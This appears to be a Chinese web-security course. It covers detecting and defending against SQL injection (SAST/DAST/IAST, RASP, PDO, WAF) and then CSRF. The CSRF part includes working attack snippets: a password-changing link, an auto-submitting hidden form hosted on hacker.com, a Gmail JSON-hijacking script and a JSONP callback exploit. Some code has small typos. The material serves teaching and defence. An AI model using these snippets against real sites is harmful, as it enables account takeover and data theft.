在个人渗透测试经历中，如果要挖掘和利用 SQL注入漏洞，那么手工注入的技能
是必备的，毕竟 sqlmap也有扫不出来的情况。一旦能够手工注入成功，哪怕
sqlmap检测不出来，我们也可以借助 tamper 脚本构造可成功注入的语句，然后
再利用sqlmap 与 tamper 脚本完成自动化的利用。无论如何，sqlmap 一直是
SQL注入领域最优秀的工具，没有之一，非常值得学习和研究。
</p>

<p>
那我们如何利用 SQL 注入写入后门，进而拿到服务器的 shell 权限，比如
sqlmap 中的&#x2013;os-shell 参数使用，还有 MySQL 新特性 secure_file_priv对读
写文件的影响呢？欢迎在留言区分享你的看法。
</p>

<p>
下一讲，我将带你了解如何检测和防御 SQL 注入，到时见~
</p>


<figure id="org4796dca">
<img src="./images/CgqCHl_y786AUgVhAAUYGxCiFok593.png" alt="CgqCHl_y786AUgVhAAUYGxCiFok593.png" width="80%">

</figure>
</div>
</div>
</section>
<section id="outline-container-SQL 注入：漏洞的检测与防御" class="outline-2">
<h2 id="SQL 注入：漏洞的检测与防御">SQL 注入：漏洞的检测与防御</h2>
<div class="outline-text-2" id="text-SQL 注入：漏洞的检测与防御">
<p>
上一讲我介绍了 SQL注入中的二次注入，二次注入是由于第一次带入参数时做了
安全转义，但开发人员在二次使用时并没有做转义，导致第二次使用时产生了注
入。前两讲中我介绍了SQL 注入的方法，这一讲我会讲接如何检测和防御 SQL
注入。
</p>
</div>
<div id="outline-container-自动化检测-sql-注入" class="outline-3">
<h3 id="自动化检测-sql-注入">自动化检测 SQL 注入</h3>
<div class="outline-text-3" id="text-自动化检测-sql-注入">
<p>
如果开发者想尽早地发现 SQL注入的问题，就需要主动对自己写的程序做一些安
全检测。现在，让我来带你了解如何自动化地检测SQL 注入漏洞。
</p>

<p>
目前检测 Web 漏洞的方式共有 3种：SAST（静态应用安全测试）、DAST（动态
应用安全测试）和IAST（交互式应用安全测试）。
</p>
</div>
<div id="outline-container-sast静态应用安全测试" class="outline-4">
<h4 id="sast静态应用安全测试">SAST（静态应用安全测试）</h4>
<div class="outline-text-4" id="text-sast静态应用安全测试">
<p>
SAST（Static Application Security Testing，静态应用程序安全测试）是通
过分应用程序源代码以提早发现安全漏洞，也包括二进制文件的静态逆向分析。
在产品形式上，主要体现为代码审计系统等。
</p>

<p>
SAST 的工作流程如下图所示：
</p>


<figure id="org4e48908">
<img src="./images/CgpVE1_2g2eAVkuXAADcNFg9Xjo146.png" alt="CgpVE1_2g2eAVkuXAADcNFg9Xjo146.png" width="80%">

</figure>

<p>
图 1：SAST 工作流程
</p>

<p>
PHP 代码的商业 SAST 产品有 RIPS、CheckMax 等，其中以 RIPS审计能力最强，
我还没见过比它更优秀的 PHP 代码审计产品。RIPS早期有开源的社区版，后来
走商业化路线，今年已经被 SonarSource收购，联合其他语言的代码审计功能打
包出售。
</p>

<p>
其他SAST工具：
</p>
<ul class="org-ul">
<li>Checkmarx: 用于发现各种安全漏洞和漏洞的静态代码分析工具。</li>

<li>Fortify Static Code Analyzer: 用于识别应用程序中的安全漏洞和漏洞的工具。</li>

<li>Coverty: 静态分析工具，用于发现代码中的缺陷和安全漏洞。</li>

<li>PMD: Java 代码的静态代码分析工具，可以帮助发现潜在的问题和不良实践。</li>
</ul>


<figure id="orgcfa1894">
<img src="./images/Ciqc1F_2urSAHFe7AALn84A3LL8747.png" alt="Ciqc1F_2urSAHFe7AALn84A3LL8747.png" width="80%">

</figure>

<p>
图 2：RIPS
</p>

<p>
SAST分析比较全面，漏洞发现率高，哪怕是当前未能执行到的代码，也可能被发
现到漏洞，但是对于它最大的挑战是如何降低误报率。
</p>

<p>
代码审计本质上是在误报率与发现率之间相互协调，直到在可接受的范围内找到
一个平衡的过程。如果发现率很高，但其中包含过多的误报，告警量多到无法运
营的程度，那也等同于没发现。就像外面反馈一个网站存在漏洞，在排查代码审
计系统之前的审计结果时，发现有过告警，但由于同一时期的告警量太多导致无
法及时跟进，发现了却未修复，就和没发现一样。
</p>

<p>
现在企业基本采用多种方式结合来测试，而不是单一地采用 SAST 方法。
</p>
</div>
</div>
<div id="outline-container-dast动态应用安全测试" class="outline-4">
<h4 id="dast动态应用安全测试">DAST（动态应用安全测试）</h4>
<div class="outline-text-4" id="text-dast动态应用安全测试">
<p>
DAST（Dynamic Application Security Testing，动态应用程序安全测试）是对
应用程序进行黑盒分析，通常在测试或运行阶段分析应用程序的动态运行状态，
通过模拟黑客行为对应用程序进行动态攻击，分析应用程序的反应，从而确定是
否存在漏洞。
</p>

<p>
DAST 的工作流程如下图所示：
</p>


<figure id="org0b0455e">
<img src="./images/CgqCHl_2g4SAOI1bAACWgAuig8I025.png" alt="CgqCHl_2g4SAOI1bAACWgAuig8I025.png" width="80%">

</figure>

<p>
图 3：DAST 工作流程
</p>

<p>
DAST 在产品形式上主要体现为漏洞扫描器，著名的商业产品有 Acunetix Web
Vulnerability Scanner（AWVS，不过近来的版本误报很多）、AppScan，还有国
内长亭在 GitHub上放出的 xray，这些都是许多“白帽子”喜欢用的扫描器。
</p>


<figure id="org6fd8463">
<img src="./images/CgqCHl_2ur-AW1scAAIEHDEbJBQ515.png" alt="CgqCHl_2ur-AW1scAAIEHDEbJBQ515.png" width="80%">

</figure>

<p>
图 4：AWVS
</p>

<p>
DAST 通过动态发送 payload来测试漏洞，所以准确率相对较高，而且检测出来
后就直接有现成的 PoC（Proof of Concept，概念验证）可以验证。但如果有些
代码未执行，就无法发现。因此，跟SAST 结合使用是最好的方式。
</p>
</div>
</div>
<div id="outline-container-iast交互式应用安全测试" class="outline-4">
<h4 id="iast交互式应用安全测试">IAST（交互式应用安全测试）</h4>
<div class="outline-text-4" id="text-iast交互式应用安全测试">
<p>
IAST（Interactive Application Security Testing，交互式应用安全测试）是
近几年兴起的一种应用安全测试新技术，曾被Gartner 咨询公司列为网络安全领
域的 Top 10 技术之一。IAST 融合了 DAST 和SAST 的优势，漏洞检出率极高、
误报率极低，同时可以定位到 API接口和代码片段。
</p>

<p>
IAST 主要有代理和插桩两种模式，其他的 VPN或流量镜像都是类似代理的流量
采集方式。IAST代理与插桩的工作流程如下图所示：
</p>


<figure id="org4527ff8">
<img src="./images/Ciqc1F_2g5aADYlMAAGfNgZdQok921.png" alt="Ciqc1F_2g5aADYlMAAGfNgZdQok921.png" width="80%">

</figure>

<p>
图 5：IAST 工作流程
</p>

<p>
以往的 DAST 漏洞扫描时，如果爬虫不到位、URL 收集不全就无法扫描到，IAST
的流量采集可以解决此类问题。同时，IAST 会借助 Hook收集应用执行信息，比
如 SQL语句的执行函数。通过检查真正执行的语句，判断其是否包含攻击性或专
用测试标记的payload，IAST 可以非常精确地识别出漏洞。
</p>

<p>
比较著名的 IAST 产品有百度的 OpenRASP-IAST，它是在 OpenRASP的基础上引
入了 DAST 扫描器，组合成完整的 IAST。除此之外，AWVS AcuSensor和
AppScan 也都引入 IAST 技术，支持在服务端部署 Agent去监控程序并采集信息，
再提供给扫描器进行进一步的扫描。
</p>


<figure id="org2a9a32a">
<img src="./images/CgqCHl_2g6CANgygAAFhDNPUKuI402.png" alt="CgqCHl_2g6CANgygAAFhDNPUKuI402.png" width="80%">

</figure>

<p>
图 6：OpenRASP-IAST
</p>

<p>
既然聊到 RASP，我就顺便说一下 RASP 与 IAST 的区别。
</p>
</div>
</div>
<div id="outline-container-h:b7b8ca26-e4ea-415d-baa4-f6bcd8176dfc" class="outline-4">
<h4 id="h:b7b8ca26-e4ea-415d-baa4-f6bcd8176dfc">RASP</h4>
<div class="outline-text-4" id="text-h:b7b8ca26-e4ea-415d-baa4-f6bcd8176dfc">
<p>
RASP（Runtime Application Self-Protection）是一项运行时应用程序自我保
护的安全技术，通过搜集和分析应用运行时的相关信息来检测和阻止针对应用本
身的攻击。RASP和 IAST 使用相同的 Agent 技术，不同之处在于 RASP 更偏向
于拦截防御，而IAST 更偏向于安全测试，若将 RASP 结合 DAST 共用的话，就
可以达到 IAST 的效果了。
</p>
</div>
</div>
</div>
<div id="outline-container-防御-sql-注入" class="outline-3">
<h3 id="防御-sql-注入">防御 SQL 注入</h3>
<div class="outline-text-3" id="text-防御-sql-注入">
<p>
我们检测到 SQL 注入漏洞，或者外部报告过来，那么又该如何修复漏洞，防止
被SQL 注入攻击呢？通常防御 SQL 注入的方法有白名单、参数化查询、WAF、
RASP等方法，下面我就简单介绍一下。
</p>
</div>
<div id="outline-container-白名单" class="outline-4">
<h4 id="白名单">白名单</h4>
<div class="outline-text-4" id="text-白名单">
<p>
如果请求参数有特定值的约束，比如参数是 <code>固定整数值</code> ，那么就只允许接收
整数；还有就是常量值限制，比如特定的字符串、整数值等。这个时候，最好采
用白名单的方式。我并不建议使用黑名单的方式，比如过滤单引号、SQL关键词，
虽然有部分效果，但在某些场景下仍会被如整数型注入、二次注入、新增的SQL
关键词等方式绕过。
</p>
</div>
</div>
<div id="outline-container-参数化查询" class="outline-4">
<h4 id="参数化查询">参数化查询</h4>
<div class="outline-text-4" id="text-参数化查询">
<p>
参数化查询是预编译 SQL语句的一种处理方式，所以也叫 <code>预编译查询</code> ，它可以将
输入数据插入到 SQL语句中的“参数”（即变量）中，防止数据被当作 SQL 语
句执行，从而防止 SQL注入漏洞的产生。
</p>

<p>
比如在下列语句中，设置 $pwd 变量值为 1 and 1=1 时：
</p>

<div class="org-src-container">
<pre class="src src-lang-sql">select password from users where id=1;
</pre>
</div>

<p>
一般情况下，SQL 语句都会经过 SQL 解析器编译并执行，这意味着 and 语句也
会被编译执行，造成 SQL 注入。
</p>

<p>
开启参数化查询时，原 SQL语言会先进行预编译处理，为用户输入的每个参数预
留占位符，将编译结果缓存起来。当用户输入恶意构造的and语句时，不做编译
处理，按原语句模板将输入值带入到对应的占位符中，此处即id 参数，也就是
说 1 and 1=1 仅为参数值带入，不作为 SQL 语句编译，那么and 语句就不会被
执行，从而防止 SQL 注入。
</p>

<p>
不同的开发平台和数据库会有不同的参数化查询方式，本讲主要以 PHP+MySQL环
境为例，有 mysqli 和 PDO（PHP 数据对象）两种扩展使用方式。这里推荐使用
PDO 扩展，因为它与关系数据库类型无关，无论是使用 MySQL，还是 SQL
Server、Oracle。
</p>

<p>
下面是使用 PDO 扩展实现参数化查询的示例代码，通过创建 PDO对象，直接调
用其方法 prepare 和 bindParam就可以实现预编译处理，将用户输入数据绑定
到特定参数，避免输入数据被当作SQL 关键词来解析。
</p>

<div class="org-src-container">
<pre class="src src-lang-php">$pdo = new PDO("mysql:host=localhost;dbname=database", "dbusername", "dbpassword");
$query = "SELECT * FROM users WHERE (name = :username) and (password = :password)";

$statement = $pdo-&gt;prepare($query, array(PDO::ATTR_CURSOR =&gt; PDO::CURSOR_FWDONLY));
$statement-&gt;bindParam(":username", $username, PDO::PARAM_STR, 10);
$statement-&gt;bindParam(":password", $password, PDO::PARAM_STR, 12);
$statement-&gt;execute();
$statement-&gt;closeCursor();
$pdo = null;
</pre>
</div>

<p>
在使用参数化查询时应注意以下 3 点：
</p>

<ol class="org-ol">
<li>在每个数据库查询中都使用参数化查询，避免被二次注入；</li>

<li>插入查询中的每一个输入参数都应进行参数化查询，避免部分参数被注入；</li>

<li>参数名不能使用指定查询中的表和字段名，避免被误操作。</li>
</ol>
</div>
</div>
<div id="outline-container-waf" class="outline-4">
<h4 id="waf">WAF</h4>
<div class="outline-text-4" id="text-waf">
<p>
WAF（Web防火墙）能够抵挡住大部分的攻击，几乎是当前各网站必备的安全产品。
但它也不是无懈可击的，难免会被绕过。不过安全本身就是为了不断提高攻击成
本而设立的，并不是为了完全、绝对地解决入侵问题。这也是很难实现的。
</p>

<p>
业界主流的 WAF 产品，可以参考 Garnet 的魔力象限。下面是 2019 年的 Web
应用防火墙魔力象限：
</p>


<figure id="org13d847f">
<img src="./images/CgpVE1_2utKAeaawAAJVqoN5A3U639.png" alt="CgpVE1_2utKAeaawAAJVqoN5A3U639.png" width="80%">

</figure>

<p>
图 7：Web 应用防火墙魔力象限
</p>

<p>
领导者产品是 Imperva 和Akamai，但这两款在国内的知名度并不高。国内的产
品只有阿里云入榜了。其他国内常用产品有腾讯云、长亭雷池、华为云。结合云
平台服务能力直接部署WAF 是最简便的方式。基于此前个人的 WAF 测试，我心
目中的国内 WAF产品排名如下：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">阿里云 WAF &gt; 腾讯云 WAF &gt; 华为云 WAF &gt; 长亭雷池
</pre>
</div>
</div>
</div>
<div id="outline-container-rasp" class="outline-4">
<h4 id="rasp">RASP</h4>
<div class="outline-text-4" id="text-rasp">
<p>
前面已经介绍过 RASP，以及它与 IAST 的区别。RASP技术是当前安全防御技术
领域的一大趋势，很多国内厂商都在做，联合 IAST一块，毕竟核心技术是共用
的。
</p>

<p>
WAF无法感知应用程序的上下文，也无法输出漏洞攻击链，对定位漏洞代码的帮
助也相当有限。RASP不用考虑网络请求中的各种复杂的数据处理过程，只需要在
对应的漏洞触发函数进行Hook 插桩检测等操作，同时 RASP 能够给出漏洞触发
的程序上下文，帮助开发人员和安全人员快速定位漏洞代码，并实现漏洞的检测、
告警和阻断。
</p>

<p>
RASP 与 WAF 是互补的两种技术实现，而非以新换旧。利用 RASP 对 WAF 进行
有效的补充，可以构建更加完善的安全防御体系。
</p>
</div>
</div>
</div>
<div id="outline-container-总结" class="outline-3">
<h3 id="总结">总结</h3>
<div class="outline-text-3" id="text-总结">
<p>
关于 SQL 注入漏洞的相关知识，到这里就结束了，我们花了 3 讲来学习 SQL注
入的技术以及如何检测和防御 SQL 注入。这里我主要介绍了一些检测与防御SQL
注入的方法，供企业开发者参考。对于个人，你也可以通过购买 WAF来防止自己
的网站被入侵。
</p>

<p>
国内的各大云平台上都已经集成 WAF服务，可以一键部署使用，十分方便。如果
你有自己的云服务器，可以建个sqlilab 靶场，用 sqlmap 去利用漏洞，然后对
比开启 WAF 前后的变化，这可以帮你更好地理解 SQL 注入漏洞。
</p>

<p>
关于 SQL注入漏洞的检测与防御，你认为还有哪些其他方法呢？欢迎在留言区分
享。
</p>

<p>
下一讲，我将带你了解 CSRF（跨站伪造请求）漏洞的相关原理，到时见~
</p>


<figure id="org302dcc3">
<img src="./images/CgqCHl_2uveAeWuPAAU0njcpiX4888.png" alt="CgqCHl_2uveAeWuPAAU0njcpiX4888.png" width="80%">

</figure>
</div>
</div>
</section>
<section id="outline-container-h:40aecdba-8bed-46b3-8e9f-5c6b403607df" class="outline-2">
<h2 id="h:40aecdba-8bed-46b3-8e9f-5c6b403607df">CSRF 漏洞：谁改了我的密码</h2>
<div class="outline-text-2" id="text-h:40aecdba-8bed-46b3-8e9f-5c6b403607df">
<p>
上一讲我介绍了 SQL注入这种常见而又危害严重的漏洞，相信你对它已经有了一
定的认识。这一讲我来介绍下被OWASP 组织列为十大 Web 漏洞威胁之一的 CSRF
（跨站请求伪造）漏洞。因为有“跨站”二字，不少人将它与 XSS 混为一谈，
但其实它们的原理并不相同。
</p>

<p>
本讲我会从 CSRF 漏洞的产生原理、攻击手法、检测方法和防御手段这 4个方面
出发，全面地介绍 CSRF 漏洞，带你领略 CSRF的危害，并能够自主挖掘和防御
此类漏洞。
</p>
</div>
<div id="outline-container-什么是-csrf-漏洞" class="outline-3">
<h3 id="什么是-csrf-漏洞">什么是 CSRF 漏洞</h3>
<div class="outline-text-3" id="text-什么是-csrf-漏洞">
<p>
CSRF（Cross Site Request Forgery，跨站请求伪造，也叫XSRF）漏洞是由于未
校验请求来源，导致攻击者可在第三方站点发起 HTTP 请求，并以受害者的目标
网站登录态（cookie、session等）请求，从而执行一些敏感的业务功能操作，
比如更改密码、修改个人资料、关注好友。
</p>

<p>
用张时序图来解释会更清楚一些，我把常用的攻击方式也画了上去，如下图所示：
</p>


<figure id="org5881fde">
<img src="images/Ciqc1GABMr-AHqkcAADt9MaFOrw521.jpg" alt="Ciqc1GABMr-AHqkcAADt9MaFOrw521.jpg" width="80%">

</figure>

<p>
图 1：CSRF 跨站请求伪造原理
</p>

<p>
从以上可以得知，CSRF 比较依赖业务功能。有时虽然存在 CSRF但并没有实际危
害，也不能算是真正意义上的 CSRF漏洞。比如常规的登录账号功能，如果你不
知道密码就无法登录，而如果知道了，那还需要构造CSRF请求吗？如果是为了实
现多次登录失败，令目标账号暂时无法登录，那么也不需要用CSRF。
</p>

<p>
如果是一些发消息、发微博的功能，那同样可以产生蠕虫效果，新浪和腾讯微博
就曾发生过好多次此类CSRF 蠕虫漏洞。
</p>


<figure id="org247f676">
<img src="./images/Cip5yF_2g_yAUoRXAAFpA1BKnYQ265.png" alt="Cip5yF_2g_yAUoRXAAFpA1BKnYQ265.png" width="80%">

</figure>

<p>
图 2：新浪微博 CSRF 蠕虫
</p>

<p>
在第 4 讲的 XSS 课程中，我曾介绍过 Samy 蠕虫，它利用 XSS漏洞在用户资料
插入一段 JS脚本，致使任何查看它的用户在不知情的情况下执行各种操作（关
注用户、修改个人资料等等），这种可称为“本站请求伪造”（On-site
Request Forgery，OSRF）。有些人可能也因此将 CSRF 归类到 XSS中，但注意
此处产生危害的本质是 XSS 造成的，只不过是利用 XSS来发起本站请求伪造，
与跨站请求伪造情况不同。
</p>

<p>
所以，我个人更偏向将 XSS 与 CSRF当作完全不同的漏洞类型来看待，并不赞成
将 CSRF 归入 XSS 中。
</p>
</div>
</div>
<div id="outline-container-csrf-分类" class="outline-3">
<h3 id="csrf-分类">CSRF 分类</h3>
<div class="outline-text-3" id="text-csrf-分类">
<p>
从漏洞利用角度来分类的话，CSRF 可以分为 CSRF 读与 CSRF 写。
</p>

<ul class="org-ul">
<li><b>CSRF 读</b> ：通过伪造请求来获取返回的敏感信息，比如用户资料；常见的就
是JSON 劫持（详见下文），以及利用 Flash API 加载页面获取敏感信息。由
于浏览器已经默认禁止 Flash，我就不介绍 Flash CSRF 的攻击手法了。</li>

<li><b>CSRF写</b> ：通过伪造请求去修改网站数据，比如修改密码、发表文章、发送
消息等操作。</li>
</ul>
</div>
</div>
<div id="outline-container-csrf-的攻击手法" class="outline-3">
<h3 id="csrf-的攻击手法">CSRF 的攻击手法</h3>
<div class="outline-text-3" id="text-csrf-的攻击手法">
<p>
以 DVWA 中的 CSRF 题目（Security Level 设置为Low）为例，我们通过一个实
例了解下 CSRF 的常用攻击手法。
</p>


<figure id="org085ffc1">
<img src="./images/Cip5yF_2hAeAApf4AABiUbYWPr8607.png" alt="Cip5yF_2hAeAApf4AABiUbYWPr8607.png" width="80%">

</figure>

<p>
图 3：DVWA CSRF 题目
</p>

<p>
输入密码提交的同时抓包。此处我直接用 Chrome 的 Network 功能（在《01 ​|武器库：常用的渗透测试工具》中介绍过）：
</p>


<figure id="org1078884">
<img src="./images/Cip5yF_2hA-AM63XAADlUkAUtF0820.png" alt="Cip5yF_2hA-AM63XAADlUkAUtF0820.png" width="80%">

</figure>

<p>
图 4：更改密码的请求包
</p>

<p>
抓包后发现只是个 GET请求，那利用起来就简单了：直接构造以下链接发给受害
者，受害者点击后就会被修改密码为你设置的密码。如下所示：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">http://127.0.0.1/vulnerabilities/csrf/?password_new={你设置的密码}&amp;password_conf={你设置的密码}&amp;Change=Change
</pre>
</div>

<p>
像这种 GET 型的 CSRF 漏洞利用就是仅需要修改下原 GET的参数值，构造个链
接发给对方就可以了；甚至直接使用图片链接嵌入到受害者可能访问的页面（博
客、论坛、邮件等等），也可以实现漏洞的利用，这种利用方式更加隐蔽。
</p>

<p>
如果是 POST 请求，就需要编写利用代码，用 JS脚本去实现自动提交表单，然
后把它放在自己控制的服务器上。假设存放地址为
<a href="http://hacker.com/exploit.html">http://hacker.com/exploit.html</a> ，再生成短网址 <a href="http://dwz.date/d74a">http://dwz.date/d74a</a> 发给
受害者。
</p>


<figure id="org5d3822a">
<img src="./images/CgpVE1_2hBiALUGsAAQ2XWTdSOE628.png" alt="CgpVE1_2hBiALUGsAAQ2XWTdSOE628.png" width="80%">

</figure>

<p>
图 5：短网址生成
</p>

<p>
exploit.html 利用代码如下：
</p>

<div class="org-src-container">
<pre class="src src-lang-xml">&lt;html&gt;
&lt;form name = "test" action = "http://127.0.0.1/vulnerabilities/csrf" method = "post" &gt;
&lt;input type = "hidden" value="hacker" name="password_new" &gt;
&lt;input type = "hidden" value="hacker" name="password_conf" &gt;
&lt;input type = "hidden" value="Change" name="Change" &gt;
&lt;/form&gt;
&lt;script&gt;document.test.submit();&lt;/script&gt;
&lt;/html&gt;
</pre>
</div>

<p>
这里是就模拟原网站的表单提交内容设置的，每个 input 都添加
type="hidden"的属性是为了不在网页中显示，最后再利用
document.test.submit()去自动提交表单，其中 "test" 是指 form 名单。
</p>

<p>
如果受害者访问上述包含 exploit.html 的 <a href="http://dwz.date/d74a">http://dwz.date/d74a</a> ，就会发起
以下请求：
</p>


<figure id="orgb0bfdb1">
<img src="./images/CgqCHl_2hCCAEyT6AABwbigIZJo638.png" alt="CgqCHl_2hCCAEyT6AABwbigIZJo638.png" width="80%">

</figure>

<p>
图 6：通过 POST 请求利用 CSRF 漏洞
</p>

<p>
DVWA 的 CSRF 题目没有 POST 请求，上述的利用方式主要介绍的是 POST类型的
利用手法。这种方法反而比较常用，相信你在未来的 CSRF测试中能够用上。
</p>
</div>
</div>
<div id="outline-container-json-劫持攻击" class="outline-3">
<h3 id="json-劫持攻击">JSON 劫持攻击</h3>
<div class="outline-text-3" id="text-json-劫持攻击">
<p>
JSON（JavaScript Object Notation，JavaScript对象符号）是一种可以序列化
任意数据，并能被 JavaScript注释器直接处理的简单数据交换格式。我们来看
一段 JSON格式的包含用户信息的数据：
</p>

<div class="org-src-container">
<pre class="src src-lang-json">{ 
  "people":[ 
    {
      "name": "Brett",
      "email":"Brett@qq.com"
    },
    {
      "name":"Jason",
      "Jason@lagou.com"
    }
  ]
}
</pre>
</div>

<p>
JSON 劫持是一种特殊的 CSRF 攻击方式，本质上也是未对请求来源做有效校验
导致的，它主要是用来窃取服务器返回的敏感信息。
</p>

<p>
实现 JSON 劫持主要有两种攻击方式：覆写数据构造器和执行回调函数。
</p>
</div>
<div id="outline-container-覆写数据构造器" class="outline-4">
<h4 id="覆写数据构造器">覆写数据构造器</h4>
<div class="outline-text-4" id="text-覆写数据构造器">
<p>
若服务端返回的 JSON数据中包含一个序列化数组，那攻击者就可以重定义数组
构造器，以实现 JSON数据的访问。比如 2006 年的 Gmail 就曾出现过 JSON劫
持联系人列表的漏洞，漏洞 CGI 位于：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">http://mail.google.com/mail/?_url_scrubbed_
</pre>
</div>

<p>
它会返回联系人列表的 JSON 数据。
</p>

<div class="org-src-container">
<pre class="src src-lang-json">[["ct","Your Name","foo@gmail.com"], ["ct","Another Name","bar@gmail.com"] ]
</pre>
</div>

<p>
因此，可通过覆盖数组构造器来读取 JSON 数据。
</p>

<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #0000ff;">script</span>&gt;
//&#22312;&#32593;&#39029;&#28155;&#21152;&#19968;&#20010; table &#34920;&#21435;&#26174;&#31034;&#21163;&#25345;&#21040;&#30340;&#32852;&#31995;&#20154;&#20449;&#24687;
var table = document.createElement('table');
table.id = 'content';
table.cellPadding = 3;
table.cellSpacing = 1;
table.border = 0;
// &#37325;&#26032;&#23450;&#20041; Array &#26500;&#36896;&#22120;
function Array() {
  var obj = this;
  var ind = 0;
  var getNext;

  getNext = function(x) {
    obj[ind++] setter = getNext;  // &#23558;&#25968;&#32452;&#20803;&#32032;&#30340; setter &#23450;&#20041;&#20026; getNext &#20989;&#25968;
    if(x) {
      var str = x.toString();  // &#33719;&#21462; JSON &#25968;&#25454;&#24182;&#36716;&#25442;&#25104;&#23383;&#31526;&#20018;
      if ((str != 'ct')&amp;&amp;(typeof x != 'object')&amp;&amp;(str.match(/@/))) {
        var row = table.insertRow(-1); // &#25351;&#23450;&#34892;&#23614;&#37096;
        var td = row.insertCell(-1);  // &#25351;&#23450;&#21015;&#23614;&#37096;
        td.innerHTML = str;  // &#25554;&#20837;&#21040;&#34920;&#26684;&#20013;
      }
    }
  };
  this[ind++] setter = getNext;
}
function readGMail() {
  document.body.appendChild(table);
}
&lt;/<span style="color: #0000ff;">scirpt</span>&gt;
&lt;<span style="color: #0000ff;">script</span> <span style="color: #a0522d;">src</span>=<span style="color: #8b2252;">"http://mail.google.com/mail/?_url_scrubbed_"</span>&gt;&lt;/<span style="color: #0000ff;">script</span>&gt;
</pre>
</div>

<p>
从以上代码中我们可以总结整个攻击流程：
</p>

<ol class="org-ol">
<li>通过 <code>&lt;script&gt;</code> 加载目标 JSON 对象到页面中；</li>

<li>覆写 Array 对象，并设置数组元素的 setter 为 getNext
函数，有时也可以使用 Object.prototype.__defineSetter__来覆盖 setter；</li>

<li>getNext 函数读取包含联系人信息的 JSON 信息。</li>
</ol>
</div>
</div>
<div id="outline-container-执行回调函数" class="outline-4">
<h4 id="执行回调函数">执行回调函数</h4>
<div class="outline-text-4" id="text-执行回调函数">
<p>
不同域名之间传递数据时，无法通过 JavaScript直接跨域访问，因此需要在访
问脚本的请求中指定一个回调函数，用于处理 JSON数据。正因如此，攻击者也
可以利用它来劫持其他域返回的数据。这种攻击方式是当前JSON 劫持中最为常
见的方式。
</p>

<p>
以前的 QQ 网购就曾出现过这种 JSON 劫持漏洞，其利用代码如下：
</p>

<div class="org-src-container">
<pre class="src src-lang-xml">&lt;html&gt;
&lt;body&gt;
&lt;script&gt;
  function any(obj){
    alert(obj); 
  }
&lt;/script&gt;
&lt;script src='http://act.buy.qq.com/w/newbie/queryisnew?callback=any' &gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre>
</div>

<p>
通过 callback 参数指定返回数据的处理函数 any，在 any 函数中，你可以根
据JSON数据内容执行特定的处理，获取你想要的数据然后回传到自己控制的服务
器上。
</p>
</div>
</div>
</div>
<div id="outline-container-csrf-检测方法" class="outline-3">
<h3 id="csrf-检测方法">CSRF 检测方法</h3>
<div class="outline-text-3" id="text-csrf-检测方法">
<p>
通过前面对 CSRF 原理的讲解，测试思路就很容易了：
</p>

<ol class="org-ol">
<li>抓包记录正常的 HTTP 请求；</li>

<li>分析 HTTP 请求参数是否可预测，以及相应的用途；</li>

<li>去掉或更改 referer 为第三方站点，然后重放请求；</li>

<li>判断是否达到与正常请求的同等效果，若是则可能存在 CSRF
漏洞，反之则不存在。</li>
</ol>

<p>
自动化的测试思路也是一样的实现方法，只不过很多时候不知道请求参数的实际
用途，比较难评估其危害和价值。正如前面所说的，CSRF的危害取决于参数用途，
这也导致很多时候需要人工验证，不然很容易误报。我个人认为，目前没有特别
好的自动化CSRF 检测工具，大多是一些半自动的辅助类工具，比如 BurpSuite
上的 CSRF PoC 生成功能。
</p>


<figure id="orgd980cf9">
<img src="./images/CgqCHl_2hDCAOdX2AACjLNgquog527.png" alt="CgqCHl_2hDCAOdX2AACjLNgquog527.png" width="80%">

</figure>

<p>
图 7：BurpSuite 的 CSRF PoC 生成功能
</p>
</div>
</div>
<div id="outline-container-防御-csrf" class="outline-3">
<h3 id="防御-csrf">防御 CSRF</h3>
<div class="outline-text-3" id="text-防御-csrf">
<p>
防御 CSRF的关键思路就是令请求参数不可预测，所以常用的方法就是在敏感操
作请求上使用POST 代替 GET，然后添加验证码或 Token 进行验证。
</p>

<p>
这里不推荐 referer（即请求头中的来源地址）限制方法，因为通过
javascript:// 伪协议就能以空 referer的形式发起请求，很容易绕过限制。如
果你直接禁止空 referer，一些移动 App上的请求又可能无法完成，因为移动
App 上的 http/https 请求经常是空referer。
</p>
</div>
<div id="outline-container-验证码" class="outline-4">
<h4 id="验证码">验证码</h4>
<div class="outline-text-4" id="text-验证码">
<p>
在一些重要的敏感操作上设置验证码（短信、图片等等），比如更改密码（此场
景下也可要求输入原密码，这也是不可预测值）、修改个人资料等操作时。
</p>


<figure id="org855a372">
<img src="./images/Ciqc1F_2hGWAGo1QAABWmNbVgkE652.png" alt="Ciqc1F_2hGWAGo1QAABWmNbVgkE652.png" width="80%">

</figure>

<p>
图 8：修改绑定手机号增加短信验证
</p>
</div>
</div>
<div id="outline-container-token-验证" class="outline-4">
<h4 id="token-验证">Token 验证</h4>
<div class="outline-text-4" id="text-token-验证">
<p>
对于 CSRF 的防御，Token 验证无疑是最常用的方法，它对用户是无感知的，体
验上比验证码好太多了。
</p>

<p>
在提交的表单中，添加一个隐藏的Token，其值必须是保证不可预测的随机数，
否则没有防御效果。下面是服务器生成并返回给当前用户的：
</p>

<div class="org-src-container">
<pre class="src src-lang-xml">&lt;input type = "hidden" value="afcsjkl82389dsafcjfsaf352daa34df" name="token" &gt;
</pre>
</div>

<p>
提交表单后，会连同此 Token 一并提交，由服务器再做比对校验。
</p>

<p>
生成 Csrf Token 的算法，常常会取登录后 cookie
中的某值作为输入，然后采用一些加密/哈希算法生成，这也是为了方便后台校验和区分用户。
</p>

<p>
除了 Cookie Token，还可以使用伪随机值的 Session Token，即服务端生成一
个伪随机数，存储到 $_SESSION 中，然后返回给用户的页面中隐藏此 Token；
等用户提交后，再拿它与存储在 $_SESSION 的 Token 值比较。这是当前比较常
用的 Token 生成与校验方式。
</p>

<p>
对于 PHP 网站，推荐使用 <a href="https://owasp.org/www-project-csrfprotector/">OWASP CSRFProtector</a>，我们来看它是如何生成和校验
Token 的。
</p>

<p>
首先调用 random_bytes 函数、openssl_random_pseudo_bytes 函数或是
mt_rand 函数随机生成 Token，长度可配置，默认 128 位:
</p>

<div class="org-src-container">
<pre class="src src-java"><span style="color: #b22222;">/*</span>
<span style="color: #b22222;"> * Function: generateAuthToken</span>
<span style="color: #b22222;"> * function to generate random hash of length as given in parameter</span>
<span style="color: #b22222;"> * max length = 128</span>
<span style="color: #b22222;"> *</span>
<span style="color: #b22222;"> * Parameters: </span>
